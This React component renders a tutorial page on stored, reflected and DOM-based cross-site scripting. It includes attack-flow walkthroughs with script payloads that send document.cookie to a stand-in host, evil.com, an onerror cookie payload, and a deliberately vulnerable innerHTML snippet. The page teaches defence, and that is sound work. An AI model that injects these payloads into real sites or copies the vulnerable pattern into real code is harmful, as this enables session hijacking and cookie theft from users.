import React from "react";

const XSSTypes: React.FC = () => (
  <div className="p-8 space-y-8 rounded-xl shadow-lg mt-20">
    <h1 className="text-4xl font-extrabold border-b-2 pb-2">
      Types of XSS Attacks
    </h1>
    <p className="text-sm text-gray-500">Last Updated: 16 Jan, 2026</p>

    <p className="text-lg leading-relaxed">
      Cross-Site Scripting (XSS) attacks come in different forms based on how the malicious
      script is injected and executed. Understanding these types helps in implementing
      appropriate defenses.
    </p>

    <h2 className="text-3xl font-bold mt-8">Three Main Types of XSS</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Type</th>
            <th className="p-3 border">Storage</th>
            <th className="p-3 border">Trigger</th>
            <th className="p-3 border">Impact</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">Stored XSS</td>
            <td className="p-3 border">Server database</td>
            <td className="p-3 border">Page load</td>
            <td className="p-3 border">High - affects all users</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Reflected XSS</td>
            <td className="p-3 border">URL/Request</td>
            <td className="p-3 border">Click malicious link</td>
            <td className="p-3 border">Medium - targeted</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">DOM-based XSS</td>
            <td className="p-3 border">Client-side</td>
            <td className="p-3 border">JavaScript execution</td>
            <td className="p-3 border">Medium - client only</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">1. Stored XSS (Persistent)</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Stored XSS Attack Flow:

1. Attacker submits malicious content:

   Comment: <script>document.location='http://evil.com/
            steal.php?c='+document.cookie</script>

2. Server stores the malicious script in database

3. Victim visits the page containing the comment

4. Script executes in victim's browser

5. Victim's cookies sent to attacker's server

Common Targets:
- Comment sections
- User profiles
- Forum posts
- Product reviews
- Message boards`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">2. Reflected XSS (Non-Persistent)</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Reflected XSS Attack Flow:

1. Attacker crafts malicious URL:

   http://vulnerable.com/search?q=<script>
   document.location='http://evil.com/steal.php?
   c='+document.cookie</script>

2. Attacker sends link to victim (email, social media)

3. Victim clicks the link

4. Server reflects the script in the response:
   <p>Results for: <script>...</script></p>

5. Script executes in victim's browser

Common Targets:
- Search functionality
- Error messages
- Login pages
- Any URL parameters displayed on page`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">3. DOM-based XSS</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`DOM-based XSS Attack Flow:

Vulnerable JavaScript code:
  var search = document.location.hash.substring(1);
  document.getElementById("results").innerHTML =
    "You searched for: " + search;

Attack URL:
  http://vulnerable.com/page.html#<img src=x
  onerror=alert(document.cookie)>

Key Difference:
- Payload never sent to server
- Entire attack happens in the browser
- Server logs show no malicious content
- Harder to detect with traditional WAFs

Common Sources (Untrusted Input):
- document.URL
- document.location
- document.referrer
- window.name

Common Sinks (Dangerous Functions):
- innerHTML
- document.write()
- eval()
- setTimeout()/setInterval()`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">XSS Type Comparison</h2>
    <div className="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg mt-4">
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li><strong>Stored:</strong> Most dangerous, persists until removed, affects all visitors</li>
        <li><strong>Reflected:</strong> Requires victim interaction, targeted attacks</li>
        <li><strong>DOM-based:</strong> Client-side only, bypasses server-side filters</li>
      </ul>
    </div>

    <h2 className="text-3xl font-bold mt-8">Key Points to Remember</h2>
    <div className="bg-yellow-50 dark:bg-yellow-900/20 p-4 rounded-lg mt-4">
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li>Stored XSS is most dangerous as it affects all users viewing the content</li>
        <li>Reflected XSS requires social engineering to get victims to click links</li>
        <li>DOM-based XSS happens entirely in the browser without server involvement</li>
        <li>All types can steal cookies, hijack sessions, and perform actions as user</li>
        <li>Different types require different prevention strategies</li>
        <li>Testing should cover all three types of XSS vulnerabilities</li>
      </ul>
    </div>
  </div>
);

export default XSSTypes;
